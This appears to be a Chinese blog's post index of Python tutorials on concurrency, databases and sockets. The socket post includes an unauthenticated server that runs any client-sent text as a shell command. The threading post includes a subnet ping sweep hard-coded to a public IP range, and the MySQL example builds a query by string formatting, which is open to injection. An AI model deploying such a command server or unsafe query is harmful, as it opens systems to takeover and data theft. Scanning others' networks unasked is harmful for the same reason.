#等待进程池中的任务执行完毕\nprint(\"任务结束\")\n\n\n########### 线程池的步骤\np = ThreadPool(3) # 实例化\np.apply_async(func) # 函数      # 可以将返回值.get() 但是get也会i阻塞\np.close()\np.join()   # join()语句要放在close()语句后面\n\n\n# 进程池比线程池耗费资源\n\n\n# 可以将返回值.get() 但是get也会i阻塞\nasync_result = p.apply_async(func) # 函数\nprint(async_result.get())\n\n```\n\n\n\n###### 使用进程池来实现并发服务器\n\n```python\n# 使用池来实现并发服务器\n# 先开一个进程池， 每个进程下面再开一个线程\n\nimport socket\nfrom multiprocessing import Pool, cpu_count\nfrom multiprocessing.pool import ThreadPool\n\n\ndef woeker_thread(conn):  # 使用线程池来\n    while True:\n        recv_data =conn.recv(1000)\n        if recv_data:\n            print(recv_data)\n            conn.send(recv_data)\n        else:\n            conn.close()\n            break\n\ndef worker_process(server): # 使用进程池来接收套接字\n    # pool = Pool(cpu_count()*2)     # 通常可以分配2倍的cpu个数\n    pool = ThreadPool(cpu_count()) # 获取电脑核心数\n    while True:\n        conn, addr = server.accept()\n        pool.apply_async(woeker_thread, args=(conn,))\n\n\nif __name__ == '__main__':\n    server = socket.socket()\n    server.bind(('127.0.0.1', 8888))\n    server.listen(1000)\n    n = cpu_count()  # 获得当前计算机的cpu核心数量\n    pool = Pool(n)\n    for i in range(n):  # 充分利用cpu，为每个cpu分配一个进程\n        # conn, addr = server.accept()\n        pool.apply_async(func=worker_process, args=(server,))\n        pool.apply_async(func=worker_process, args=(server,))\n    pool.close()\n    pool.join()\n\n```\n\n\n\n\n\n","tags":["进程"],"categories":["Python"]},{"title":"python-数据库编程","url":"%2Fposts%2F57831%2F","content":"\n\n\n## Python DBA API\n\n###### 包含的内容\n<img src=\"http://image.xpshuai.cn/pydb1.png\"></img>\n\n###### 访问数据库流程\n<img src=\"http://image.xpshuai.cn/pydb2.png\"></img>\n\n\n\n\n\n#### 与MySQL\n\n```python\nimport pymysql\n\ndb_config = {\n    'host': '127.0.0.1',\n    'user': 'hhh',\n    'password': '123',\n    'db': 'test',\n    'charset': 'utf8'\n}\n\n# 插入\ntry:\n    conn = pymysql.connect(**db_config)\n    cursor = conn.cursor()\n\t\n    # 插入\n    id = '2018002'\n    name =  'admin'\n    age = 18\n    # insert into student values(id,name,age)\n    sql = 'insert into student(id, name, age) values(%s,%s,%s)'\n    cursor.execute(sql, (id, name, age))\n\n    # 删除\n    # table = 'students'\n    # condittion = 'age > 20'\n    # sql = 'delete from {table} where {condittion}'.format(table=table, condittion=condittion)\n    \n    # 查询\n    sql = \"SELECT password FROM admin WHERE name='%s'\" % (name)\n    cursor.execute(sql)\n    pws = cursor.fetchall()\n   \nexcept:\n    print('error')\n    conn.rollback()\nfinally:\n    conn.commit() # 数据有变动一定记得提交/双保险\n    cursor.close()\n    conn.close()\n```\n\n###### cursor对象支持的方法\n\n<img src=\"http://image.xpshuai.cn/pydb3.png\"></img>\n\n\n\n#### 与MongoDB\n\n```python\nfrom pymongo import *\n\n#建立连接\nclient = MongoClient('127.0.0.1',27017)\n#指定数据库\ndb = client.test\n#指定集合\ncollection = db.col\n\n# print(type(collection),collection)\n\n# python连接mongodb就搞定\nmydict ={\n    '_id': 6,\n    'name': 'admin',\n    'age': 18,\n    'addr': 'didu'\n}\n\n# collection.insert(mydict)\n# print(collection.find())\n# for i in collection.find():\n#     print(i)\n\n# for i in collection.find({'name':'zhanglinlin'}):\n#     print(i)\n\ncollection.update({'name':'zhanglinlin'},{'$set':{'age':22}},{'mult':'true'})\n\n\n# collection.remove()\n```\n\n\n\n#### 与redis\n\n```python\nimport redis\n\n# # 连接,给定参数ip/port， redis默认端口6379\nr = redis.Redis(host='127.0.0.1', port='6379')\n# # print(type(r),r)\n#\n# # 设置键值对\nr.set('name', 'admin')\n# # 获取该键的值\nstr = r.get('name')\nprint(str.decode('utf-8')) # 解码\n\n## 自动解码 参数：decode_responses=True\nr = redis.Redis(host='127.0.0.1',port='6379',decode_responses=True)\nr.set('name','哈哈')\nstr = r.get('name')\nprint(str)\n\n## StrictRedis\nr = redis.StrictRedis(host='127.0.0.1',port='6379')\nr.set('name','哈哈')\nstr = r.get('name')\nprint(str,str.decode('utf-8'))\n## `Redis`和`StrictRedis`区别：Redis兼容旧版本python2\n\n#\nk_v = {\n    'a1':'a',\n    'a2':'b',\n    'a3':'c'\n}\nr = redis.StrictRedis(host='127.0.0.1',port='6379')\n# 批量设置值\nr.mset(**k_v)\n# 批量取值\nprint(r.mget('a1','a2','a3'))\n\n#\nr = redis.StrictRedis(host='127.0.0.1',port='6379')\n# 往列表添加值从头部开始\nr.lpush('list1','haha')\nr.lpush('list1',3,4,5)\n# 获取列表值\nprint(r.lrange('list1',0,-1))\n\n#\nr = redis.StrictRedis(host='127.0.0.1',port='6379')\nr.sadd('set1','aa')\nr.sadd('set2','aa',8,10,'bb')\nprint(r.smembers('set2'))\n\n```\n\n\n\n#### 与memcached\n\n```python\nimport memcache\n\n\n# 建立连接\nmc = memcache.Client(['127.0.0.1:11211'], debug=True)\n\n# 设置一个\nmc.set('name', 'xps',time=60)\n# 设置多个\nmc.set_multi({\"username\":\"handsome\", \"gender\":\"man\"}, time=60)\n\n# 获取一个\nmc.get('age')\n# 获取多个\n# 不管是元组还是列表都行，只要可迭代就行\nres1 = mc.get_multi((\"username\", \"gender\"))\nres2 = mc.get_multi([\"username\", \"gender\"])\n\nprint(res1)\nprint(res2)\n\n\n# 删除一个\nmc.delete(\"key\")\n# 删除多个\nmc.delete_multi([\"key1\", \"key2\"])\n\n\"\"\"\n# 0表示永不过期  断电就会完蛋   适合做验证码\n# prepend 前插\n# append  后插\n# telnet ip port 远程连接\n\"\"\"\n```\n\n\n\n这里仅仅做了简单的介绍，具体还需要自己练习中学习","tags":["Python"],"categories":["Python"]},{"title":"python-多线程","url":"%2Fposts%2F59675%2F","content":"\n\n  \n## 讲解\n###### 进程\n\n是程序的一次执行。\n每个进程都有自己的地址空间、内存、数据栈以及其他记录运行轨迹的辅助数据\n\n###### 线程\n\n所有的线程运行在同一个进程当中，共享相同的运行环境。\n线程有：开始、顺序执行、结束 三个部分。\n多个线程协同完成一个进程的任务。\n\n> 我们在编写安全工具的时候，使用多线程要更多些(使用多进程相对较少)\n\n\n\n  \n### thread\n\n> 缺点：程序复杂时，不能计算线程数量和控制，稳定性不太好\n\n使用`_thread.start_new_thread(ping_check, (ip,))` ，第一个参数是回调函数，第二个的可变参数(tuple类型的)\n\nNote： 必须配合`time.sleep()`\n\n实例:\n\n```python\n\"\"\"\n使用ping检查C段机器(一个C段是0-255)\n\n\"\"\"\n\nimport _thread\nimport time\nimport re\nfrom subprocess import Popen,PIPE\n\n\ndef ping_check(ip_addr):\n    # 一个执行系统命令的模块\n    check = Popen(['/bin/bash', '-c', 'ping -c 2 '+ip_addr], stdin=PIPE,stdout=PIPE)\n    data = check.stdout.read()   # 返回的数据\n    if 'ttl' in str(data):\n        print(\"{} is up\".format(ip_addr))\n\n\n\ndef main(ip_three):\n    for i in range(255):\n        ip = ip_three + '.' + str(i)\n        _thread.start_new_thread(ping_check, (ip,))\n        time.sleep(0.1)\n\n\n\nif __name__ == '__main__':\n    ip_three = input(\"输入ip地址的前三个字节(不需要最后一个点): \\n\")\n    # 判断最后是否有点\n    pattern = r'\\.$'\n    has_point = re.findall(pattern, ip_three)\n    if has_point:\n        ip_three = ip_three[:-1]\n        print(ip_three)\n    main(ip_three)\n```\n\n\n\n\n\n## threading **(重点)**\n\n###### 1.Thead类\n\n- 使用threading模块\n- 子类化Thread类\n\n> 解决了线程数量可控的问题\n\n简单例子：\n\n```python\nimport threading\nimport time\nimport requests\n\n\ndef func1(key):\n    print(\"Hello %s:%s\"%(key, time.ctime()))\n    print(threading.current_thread())  # 当前线程\n    print(\"*\"*20)\n\n\ndef main():\n    threads = []\n    keys = ['张三', '李四', '王五', '陆大人']\n    threads_count = len(keys)\n    # 生成参数长度个线程数\n    for i in range(threads_count):\n        t = threading.Thread(target=func1, args=(keys[i],))\n        threads.append(t)   # 线程加入线程列表\n\n    # 启动线程\n    for i in range(threads_count):\n        threads[i].start()\n\n    # 等待线程结束 join()\n    for i in range(threads_count):\n        threads[i].join()    # 保证【所有】的线程都会结束 再运行主线程   遇到join会阻塞\n\n\n\nif __name__ == '__main__':\n    main()\n```\n\n实例:\n\n```python\n\"\"\"\n对百度以10个线程访问10次\n\"\"\"\n\nimport threading\nimport time\nimport requests\nimport sys\n\n\ndef func1():\n    time_start = time.time()\n    r = requests.get(url='http://www.baidu.com')\n    times = time.time() - time_start     # 耗时\n    sys.stdout.write(\"Status:%s---%s---%s\"%(r.status_code, times, time.strftime(\"%H:%M:%S\")))  # 当前时间\n    print(\"\")\n\n\ndef main():\n    threads = []\n    threads_count = 10    # 定义 线程数\n    # 生成参数长度个线程数\n    for i in range(threads_count):\n        t = threading.Thread(target=func1)\n        threads.append(t)   # 线程加入线程列表\n\n    # 启动线程\n    for i in range(threads_count):\n        threads[i].start()\n\n    # 等待线程结束 join()\n    for i in range(threads_count):\n        threads[i].join()     # 保证【所有】的线程都会结束 再运行主线程   遇到join会阻塞\n\n\n\n\nif __name__ == '__main__':\n    main()\n```\n\n###### 2.生产者-消费者问题 和 Queue模块 ***(重中之重)\\***\n\n- Queue模块[ qsize(), empty(), full(), put(), get() ]\n- 完美搭档：Queue + Thread\n\n> 解决了生产参数和计算结果时间都不确定的问题\n\n> 最常使用\n\n**Queue：**\n\n将产生的货物放到Queue中，消费者从Queue中拿数据\n\n```python\nimport Queue\n\nq = queue.Queue(100)  # 可以直接指定队列的大小\n\nfor i in range(10):\n    q.put(i)  # 也可以这样放入\n\nq.empty()    # 查看是否为空\n\nq.qsize()    # 查看大小\n\nq.get()   # 依次取出数据\n\nq.full()   # 是否满了\n\nqueue.task_done()  # 告诉队列，这个任务执行完成了\n```\n\n生产者消费者讲解：\n\n```python\n\"\"\"\n所谓，生产者与消费者模型，其实是把一个需要进程通信的问题分开考虑\n生产者，只需要往队列里面丢东西（生产者不需要关心消费者）\n消费者，只需要从队列里面拿东西（消费者也不需要关心生产者\n\n生产者：\n只关心队列是否已满。\n没满，则生产，满了就阻塞。\n\n消费者：\n只关心队列是否为空。\n不为空，则消费，为空则阻塞。\n\n\"\"\"\nfrom threading import Thread   # 线程\nimport random\nimport queue\nimport threading\nimport time\n\n\nclass Produce(Thread):\n    def __init__(self, queue):\n        super().__init__()\n        self.queue = queue\n\n    def run(self):\n        while True:\n            item = random.randint(0,99)\n            if self.queue.full():\n                print(\"当前队列长度{}\".format(self.queue.qsize()))\n            self.queue.put(item)   # 只要队列没满， 向队列存入数据\n            print(\"生产者%s ==> 已经生产 %s, 并将其加入到了队列中\" %(threading.current_thread(),item))\n\n\nclass Consumer(Thread):\n    def __init__(self, queue):\n        super().__init__()\n        self.queue = queue\n\n    def run(self):\n        while True:\n            item = self.queue.get()    # 只要队列不为空， 就从队列中取出数据\n            print(\"消费者 ==> 从队列中取出 %s\" %item)\n            self.queue.task_done()  # 告诉队列，这个任务执行完成了\n\n\nif __name__ == '__main__':\n    q = queue.Queue(10000)\n    p = Produce(q)\n    p1 = Produce(q)\n    c = Consumer(q)\n    p.start()\n    p1.start()\n    time.sleep(5)\n    c.start()\n```\n\n实例：\n\n```python\n\"\"\"\n使用 threding 和 Quque 结合， ping_check\n\"\"\"\n\nimport threading\nimport queue  # 注意是小写\nfrom subprocess import Popen,PIPE\nimport sys\n\n\n# 继承多线程的类\nclass DoRun(threading.Thread):\n    def __init__(self, queue):\n        # threading.Thread.__init__(self)\n        super().__init__()\n        self._queue = queue\n\n    # 重写了run方法\n    def run(self):\n        # 如果Queue不为空就继续执行\n        while not self._queue.empty():\n            ip = self._queue.get()\n            check_ping = Popen(['/bin/bash','-c','ping -c 2 '+ip], stdin=PIPE, stdout=PIPE)\n            data = check_ping.stdout.read()\n            if 'ttl' in str(data):\n                sys.stdout.write(ip + \" is up\")\n                print()\n\n\ndef main():\n    threads = []\n    threads_count = 10\n    # 创建一个空的队列\n    q = queue.Queue()\n\n    # put到队列\n    for i in range(1,255):\n        q.put(\"123.206.96.\"+str(i))\n\n    # 多线程\n    for i in range(threads_count):\n        threads.append(DoRun(q))\n\n    # 启动\n    for i in threads:\n        i.start()\n\n    for i in threads:\n        i.join()\n\nif __name__ == '__main__':\n    main()\n```","tags":["Python"],"categories":["Python"]},{"title":"python-socket编程","url":"%2Fposts%2F15426%2F","content":"\n## 讲解\n\n#### C/S架构\n\n客户机和服务器结构\nServer唯一的目的就是等待client的请求，client连上server发送必要的数据，然后等待server端完成请求的范阔\n\n\n\n#### C/S网络编程\n\nServer端进行设置，首先创建一个通信端点，让server端能够监听请求，之后就进入等待和处理Client请求的无限循环中\n\nClient编程相对Server端编程简单，只要创建一个通信端点，建立到服务器的连接，就可以提出wing我就来\n\n\n\n\n\n#### 套接字(socket)\n\n是一种具有之前所说的“通信端点”概念的计算机网络数据结构。网络化的应用程序在开始任何通讯之前都必须创建套接字\n\n> 套接字 = (ip, 端口)\n\n\n\n**Python支持:**\n\n\\- AF_UNIX              --> Unix下进行通信的\n\n\\- AF_NETLINK        --> 是Linux下的套接字\n\n\\- AF_INET               --> 是基于网络的套接字 （我们下面的重点）\n\n\n\nPython的`socket模块`创建TCP/IP套接字，方法如下：\n\n```python\n# 参数（套接字家族，套接字类型）\n# AF_INET：基于网络的， SOCK_SREAM：代表TCP/IP\n\ntcp_scoket = socket(socket.AF_INET, socket.SOCK_SREAM) \n```\n\n\n\n\n\n**套接字对象的方法：**\n\n服务端套接字函数：\n\n<img src=\"http://image.xpshuai.cn/socket01%20.png\"></img>\n\n公共用途套接字函数：\n\n<img src=\"http://image.xpshuai.cn/socket02.png\"></img>\n\n\n\n创建连接之后要关闭\n\n\n\n###### 实例:\n\n```bash\n## 1.创建-个TCP服务器\nSS. = socket()\t#创建服务器套接字\nss.bind()\t#把地址绑定到套接字上\ns.listen()\t#监听连接\ninf loop;\t#服务器无限循环\n\tCS.= ss.accept()\t#接受客户端连接\ncmmon loop;\t#通信循环\n\ts.recy0/cs.send0\t#对话(接受与发送)\ncs.close0\t#关闭客户端套接字\n\n\n## 2、创建一个TCP客户端\ncs.socket()\t#创建客户端套接字\ncs.connect()\t#尝试连接套接字\ncommon loop:\t#通信循环\n\tcs.recx0/cs.send()\t#对话(接受与发送)\ncs.close()\t#关闭客户端套接字\n\n```\n\n\n\n\n\n\n\n**反弹Shell：**\n\n在客户端获取服务端的shell\n\n1.获取Linux的shell：\n\nserver.py\n\n```python\n\"\"\"\n反弹shell\n\"\"\"\nimport socket\nfrom subprocess import Popen,PIPE     # 执行系统命令\n\nHOST = ''   # 如果是本机最为服务端，地址可以不用填写\nPORT = 8888\nBUFSIZE = 1024\nADDR = (HOST,PORT)\ntcp_server = socket.socket()   # type默认是tcp\ntcp_server.bind(ADDR)\ntcp_server.listen(5)\nprint(\"开始监听\")\n\nwhile True:\n    # 服务端和客户端的循环连接\n    print(\"Waiting fpr connecting...\")\n    coon, addr = tcp_server.accept()  # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞\n    print(\"... connected from:\" + str(addr))\n    # 下面是通信的循环\n    while True:\n        data = coon.recv(BUFSIZE)          # 读取客户端发送的消息 （指明一次性能接收的最大字节数量）\n        if data:\n            try:\n                # 执行获取服务端的系统命令（在客户端连接后可以执行服务端的命令）\n                cmd = Popen(['/bin/zsh', '-c', data], stdin=PIPE, stdout=PIPE)\n                cmd_data = cmd.stdout.read()\n                coon.send(cmd_data)\n            except Exception:\n                continue\n\n        else:\n            print(\"客户端{}已断开\".format(addr))\n            break\n\n```\n\n2.获取Window的shell：\n\n```python\n\n```\n\n\n\n\n\n\n\nclient.py不变\n\n```python\nimport socket\n\nHOST = ''   # 如果是本机最为服务端，地址可以不用填写\nPORT = 8888\nBUFSIZE = 1024\nADDR = (HOST,PORT)\n\ntcp_cient = socket.socket()\ntcp_cient.connect(ADDR)\n\nprint(\"客户端：\\n\")\n\n# 数据交互循环\nwhile True:\n    msg = input('>>>')\n    if msg:\n        tcp_cient.send(msg.encode())   # 只能发送 bytes 类型的数据\n        data = tcp_cient.recv(BUFSIZE)\n        if not data:\n            break\n        print(data.decode())\n    else:\n        break\n\n# tcp_cient.close()\n# c.close()    # 主动断开   # 服务端会recv到一个空字符串\n\n```\n\n\n\n------\n\n\n\n#### 1.阻塞的套接字\n\n> 阻塞套接字不能和多个客户端进行通信\n\nserver.py\n\n```python\n\"\"\"\n服务端：\n阻塞套接字：  --->  阻塞套接字不能和多个客户端进行通信\n\"\"\"\nimport socket\n\nHOST = ''   # 如果是本机最为服务端，地址可以不用填写\nPORT = 8888\nBUFSIZE = 1024\nADDR = (HOST,PORT)\ntcp_server = socket.socket()   # type默认是tcp\n#tcp_server.bind(('',8888))     \ntcp_server.bind(ADDR)    \ntcp_server.listen(5)           # 可以挂起的最大连接数    accept就不算挂起\nprint(\"开始监听\")\n\nwhile True:\n    # 服务端和客户端的循环连接\n    print(\"Waiting fpr connecting...\")\n    coon, addr = tcp_server.accept()  # 获取对等套接字(conn), 以及客户端地址(addr). 这个【只执行一次】，放到外面防止阻塞\n    print(\"... connected from:\" + str(addr))\n    # 下面是通信的循环\n    while True:\n        data = coon.recv(BUFSIZE)          # 读取客户端发送的消息 （指明一次性能接收的最大字节数量）\n        if data:\n            print(data.decode())\n            # 向client发送收到的信息\n            coon.send(data)\n        else:\n            print(\"客户端{}已断开\".format(addr))\n            break\n            \n #server端关闭连接\n#tcp_server.close()\n#accpet 阻塞   recv阻塞(读不到数据，就一直等到有数据为止)\n```\n\n\n\nclient.py\n\n```python\n\"\"\"\n最简单的客户端\n三种方式的客户端都是一样的\n\"\"\"\n\nimport socket\n\nHOST = ''   # 如果是本机最为服务端，地址可以不用填写\nPORT = 8888\nBUFSIZE = 1024\nADDR = (HOST,PORT)\n\ntcp_cient = socket.socket()\ntcp_cient.connect(ADDR)\n\nprint(\"客户端：\\n\")\n\n# 数据交互循环\nwhile True:\n    msg = input('>>>')\n    if msg:\n        tcp_cient.send(msg.encode())   # 只能发送 bytes 类型的数据\n        data = tcp_cient.recv(BUFSIZE)\n        if not data:\n            break\n        print(data.decode())\n    else:\n        break\n\n# tcp_cient.close()\n# c.close()    # 主动断开   # 服务端会recv到一个空字符串\n```\n\n\n\n\n\n\n\n#### 2.I/O多路复用的套接字\n\nserver.py\n\n```python\n\"\"\"\n服务端\nI/O多路复用\n\n\"\"\"\n\n\n# IO多路复用\n# epoll  事件通知事件\n\n\n# IO事件  计算机  可读事件（有数据了...）\n\n# 通知机制       （某一事情发送之后，可读之后）  轮询\n\n\n# epoll： 当socket变为可读的时候，发出通知\n# epoll： 是惰性的事件回调：    操作系统只起到通知的作用。\n# epoll： 目前Linux上效率最高的IO多路复用 技术 ！\n\n# 1.监听套接字  2.对等套接字\n\nimport socket\nimport selectors\n\n# windows没有epoll\nsel = selectors.DefaultSelector()   # 会根据不同的操作系统选择相应的解释器   在linux是epoll   根据系统自动选择\nsel2 = selectors.EpollSelector()   # 会根据不同的操作系统选择相应的解释器   在linux是epoll     Linux\n\nserver = socket.socket()\nserver.bind(('127.0.0.1',8888))\nserver.listen(5)\n\n\ndef accept(server):\n    coon, addr = server.accept()\n    sel.register(coon, selectors.EVENT_READ, read)\n\ndef read(coon):\n    data = coon.recv(1024)\n    if data:\n        print(data)\n        server.send(data.encode())\n    else:\n        print('Closing:',coon)\n        sel.unregister(coon)   # 取消监听\n        coon.close()\n# 注册事件  事件触发直接调用\nsel.register(server, selectors.EVENT_READ, accept)   # 监听事件的发生  参数三个： 套接字,可能发送的事件(变为可读事件),回调函数\n\nprint(\"开始监听\")\nwhile True:\n    events_list = sel.select()   # 返回发生了事件的列表  查询已经准备好的套接字\n    print(\"有套接字发生变化\")\n    for key, _ in events_list:  # 列表里面是个元组, key是元组里面的第一个值\n        callback = key.data   # 某个套接字绑定的函数  key.data是函数\n        callback(key.fileobj)   # 调用这个回调函数     fileobj是对应套接字\n\n\n# sel.select()     有两种情况：\n#1.  客户端请求连接 key.data是accept  key.fileobj 是server\n#2.  客户端请求连接 key.data是read  key.fileobj 是conn\n\n\"\"\"\n1.先在指定的套接字上注册对应的事件及回调\n2.不断的查询所有已经准备好资源的套接字\n3.不需要考虑套接字与事件只管调用\n\"\"\"\n```\n\nclient.py 相同\n\n\n\n\n\n#### 3.非阻塞的套接字\n\nserver.py\n\n```python\n\"\"\"\n服务端\n非阻塞套接字\n\"\"\"\nimport socket\n\n\ns = socket.socket()           # type默认是tcp\ns.bind(('127.0.0.1', 8888))\n\n# 这个必须在操作之前设置\ns.setblocking(False)   # 变为非阻塞套接字， 立刻返回异常\n\ns.listen(5)\n\nclient_list = []\n\nwhile True:        # 第一层循环只负责生成对等套接字\n    try:\n        coon, addr = s.accept()     # 多个coon才能与多个客户端进行通信\n    except BlockingIOError as e:\n        pass\n    else:\n        print(\"客户端{}连接成功\".format(addr))\n        coon.setblocking(False)  # 设置为非阻塞\n        client_list.append(coon)   # 保留已生成的对等套接字\n        # print(coon, addr)\n\n    for client_socket in client_list:   # 第二层循环 把所有已保留的套接字都执行一遍\n        try:\n            data = client_socket.recv(1024)\n        except BlockingIOError:\n            pass\n        else:\n            if data:\n                print('{}:{}'.format(client_socket, data.decode()))\n                client_socket.send(data)\n            else:\n                print('{}'.format(client_socket))\n                client_socket.close()\n                client_list.remove(client_socket)    # 成功处理完一个，就移除一个\n\n\n## 实现方法：非阻塞+轮询\n# connect操作一定会引发BlockingIOError异常\n# 如果连接没有建立，那么send操作引发OSError异常\n\n\n\"\"\"\naccept 阻塞：\n在没有新的套接字来之前，\n不能处理已经建立连接的套接字的请求\n\nrecv 阻塞:\n在没有接受到客户端请求数据之前，\n不能与其他客户端建立连接\n\"\"\"\n\n```\n\nclient.py 相同\n\n\n\n\n\n---\n\n###### 成为大师\n\n```python\n\"\"\"\n1. 多练习，一定要善于发现感兴趣的内容，通过所学知识去实现\n2. 关注相关领域：\n\t寻找大师，跟随大市，与大师同行，洞察大师，成为大师\n\t知乎，ve2x.com, github\n3.扩展：\n\t想要提高，就不能守着自己现有的东西而不去学习新的\n4.应用：\n\t根据自己的需求，动手实践，达到目标\n\t\n安全：\n\t分析行为：通过日志，分析攻击行为(re)\n\n\"\"\"\n```\n\n","tags":["socket"],"categories":["Python"]},{"title":"python-协程","url":"%2Fposts%2F52435%2F","content":"\n\n  \n#### 概念\n  \n###### 1.进程(同步)\n\n进程是系统进行资源分配和调度的一个独立单位。每个进程都有自己的独立内存空间，不同进程通过进程间通信来通信。\n\n上下文进程间的切换开销，比较大，但相对比较稳定安全\n\n###### 2.线程（同步）\n\n线程是CPU调度和分派的基本单位。\n\n线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易丢失数据。\n\n###### 3.协程（异步）\n\n**协程是一种用户态的轻量级线程，**协程的调度完全由用户控制\n\n“协程就是你可以暂停执行的函数”。协程拥有自己的寄存器上下文和栈。\n\n`非抢占式多任务`\n\n\n\n###### 协程与线程的区别:\n\n1) 一个线程可以多个协程，一个进程也可以单独拥有多个协程。\n\n2) 线程进程都是同步机制，而协程则是异步。\n\n3) 协程能保留上一次调用时的状态，每次过程重入时，就相当于进入上一次调用的状态。\n\n4）线程是抢占式，而协程是非抢占式的，所以需要用户自己释放使用权来切换到其他协程，因此同一时间其实只有一个协程拥有运行权，相当于单线程的能力。\n\n5）协程并不是取代线程, 而且抽象于线程之上, 线程是被分割的CPU资源, 协程是组织好的代码流程, 协程需要线程来承载运行, 线程是协程的资源, 但协程不会直接使用线程, 协程直接利用的是执行器(Interceptor), 执行器可以关联任意线程或线程池, 可以使当前线程, UI线程, 或新建新程.。\n\n6）线程是协程的资源。协程通过Interceptor来间接使用线程这个资源。\n\n#### 代码\n\n**greenlet**\n\n```python\n# 协程   =>又叫：非抢占式多任务\n# 中断执行\n# 线程\n\"\"\"\npip install greenlet\n\"\"\"\n\n# 基本使用\nfrom greenlet import greenlet\nimport random\nimport time\n\n\ndef Producer():\n    while True:\n        item = random.randint(0, 99)\n        print(\"pro生产了{}\".format(item))\n        c.switch(item)   # 暂停当前协程,切换到(执行的协程)消费者，并将item传入消费者\n        time.sleep(1)\n\ndef Consumer():\n    while True:\n        item = p.switch()    # 切换到生产者， 并等待消费者传入item\n        print(\"消费了{}\".format(item))\n\nc = greenlet(Consumer)   # 将一个普通函数变成协程\np = greenlet(Producer)\nc.switch()      # 让消费者先进入暂停状态， （只有恢复的时候才能接受数据）\n\n\n\n\n\"\"\"\n# greenlet 的价值\n价值一： 高性能的原生协程\n价值二： 语义更加明确的显式切换\n价值三： 直接将函数包装成协程，保持原有代码风格\n\"\"\"\n\n```\n\n\n\n**gevent**\n\ngevent是一个基于协程的python网络库，在遇到IO阻塞时，程序会自动进行切换，可以让我们用同步的方式写异步IO代码。\n\n```python\n# gevent   \n# 当一个greenlet遇到IO操作，比如访问网络，就会自动切换，直到IO操作完成，再切换回来\n# 遇到阻塞就切换到另一个协程继续执行 ！\n\"\"\"\npip install gevent\n\ngevent，通过封装了 libev（基于epoll） 和 greenlet 两个库。\n帮我们做好封装，允许我们以类似于线程的方式使用协程。\n以至于我们几乎不用重写原来的代码就能充分利用 epoll 和 协程 威力\n\"\"\"\n\nimport gevent\nfrom gevent.queue import Queue\n\n#  猴子补丁   monkey    将一些阻塞的模块动态的修改为非阻塞\nfrom gevent import monkey;monkey.patch_all()  # 不会阻塞了就\nfrom gevent import monkey;monkey.patch_socket()  # 不会阻塞了就\nimport requests\nimport gevent\n\ndef get_response():\n    print(\"start\")\n    requests.get(\"https://www.baidu.com\")\n    print(\"end\")\n\ntasks = [gevent.spawn(get_response) for i in range(20)] # 创建协程\ngevent.joinall(tasks)    # 阻塞等待协程完毕\n\n# ---------------------------------------------------------------------\n\n### gevent 并发服务器\nimport gevent\n# 将python内置的socket直接换成了IO多路复用的socket\nfrom gevent import monkey;monkey.patch_socket()\nimport socket\n\nserver = socket.socket()\nserver.bind(('127.0.0.1', 8888))\nserver.listen(1000)\n\ndef worker_coroutine(conn):\n    while True:\n        recv_data = conn.recv(1000)\n        if recv_data:\n            print(recv_data)\n            conn.send(recv_data)\n        else:\n            conn.close()\n            break\n\nif __name__ == '__main__':\n    while True:\n        conn, remote_addr = server.accept()\n        # 生成一个协程， 并将conn作为参数传入\n        gevent.spawn(worker_coroutine, conn)  \n\n\n# ---------------------------------------------------------------------\n\n# gevent 协程通信\n\"\"\"\n问题一： 协程之间不是能通过switch通信嘛？\n是的，由于 gevent 基于 greenlet，所以可以。\n\n问题二： 那为什么还要考虑通信问题？\n因为 gevent 不需要我们使用手动切换，\n而是遇到阻塞就切换，因此我们不会去使用switch ！\n\"\"\"\n\nimport gevent\nfrom gevent import monkey;monkey.patch_all()\nfrom gevent.queue import Queue\nimport random\n\nqueue = Queue(3)\n\ndef Producer():\n    while True:\n        item = random.randint(0, 99)\n        print(\"生产了{}\".format(item))\n        queue.put(item)\n\ndef Consumer():\n    while True:\n        item = queue.get()\n        print(\"消费了{}\".format(item))\n\n\np = gevent.spawn(Producer, queue)  # 将函数封装成协程， 并开始调度\nc = gevent.spawn(Consumer, queue)\n\n# gevent.sleep(5)\ngevent.joinall([p, c])    # 阻塞（一阻塞就切换协程） 等待   等待你带进来的所有协程对象结束\n```\n\n\n\n> Note:\n\n```python\n# 这三句一定要放在最上面\nimport gevent\nfrom gevent import monkey\nmonkey.patch_all()  \n```\n\n","tags":["协程"],"categories":["Python"]},{"title":"python-自带的线程池和进程池","url":"%2Fposts%2F13775%2F","content":"\n  \n```python\n# from multiprocessing import Pool   # 进程池\nfrom multiprocessing.dummy import Pool  #线程池\nfrom multiprocessing.pool import ThreadPool # 线程池\nimport threading\nimport time\n\n\ndef func(i):\n    print(\"{}-------555\".format(i))\n    time.sleep(2)\n    return i\n\ndef print_back(*args, **kwargs):\n    print(\"处理数据完成\",args, kwargs)\n\npool = Pool(6)   # 不写的话 默认是cpu的个数\n# print(threading.active_count())\n\n\n\nfor i in range(5):\n    pool.apply_async(func=func, args=(i,), callback=print_back)  ## 添加任务   不阻塞    主要使用的方法\n#     pool.apply(func=func, )  ## 添加任务   阻塞\n\n# pool.map(func, [i for i in range(5)])   #添加任务  不阻塞\n\npool.close()   #关闭线程池  不在提交新的任务\npool.join()    #等待进程池中的任务执行完毕\n\nprint(\"任务结束\")\n\n\n\n\n########### 线程池的步骤\np = ThreadPool(3) # 实例化\np.apply_async(func) # 函数      # 可以将返回值.get() 但是get也会i阻塞\np.close()\np.join()\n\n\n# 进程池比线程池耗费资源\n\n\n\n# 可以将返回值.get() 但是get也会i阻塞\nasync_result = p.apply_async(func) # 函数\nprint(async_result.get())\n```\n\n","tags":["线程池"],"categories":["Python"]},{"title":"python-线程池并发服务器","url":"%2Fposts%2F36711%2F","content":"\n\n  \nserver\n\n```python\n\n# 使用线程池来实现并发服务器\n\nimport socket\nfrom multiprocessing.dummy import Pool\n\n\ndef worker(conn):\n    while True:\n        recv_data = conn.recv(1000)\n        if  not recv_data:\n            break\n        print(\"客户端{}发送了{}\".format(conn, recv_data.decode()))\n        conn.send(recv_data)\n    conn.close()\n\n\nif __name__ == '__main__':\n    server = socket.socket()\n    server.bind(('127.0.0.1', 8888))\n    server.listen(1000)\n    pool = Pool(3)\n    while True:\n        conn, addr = server.accept()\n        print(\"客户端{}连接成功\".format(addr))\n        pool.apply_async(func=worker, args=(conn,))\n\n```\n\n\nclient\n  \n```python\nimport socket\n\n\nc = socket.socket()\n\nc.connect(('127.0.0.1',8888))\n\nwhile True:\n    msg = input('>>>')\n    if msg:\n        c.send(msg.encode())   # 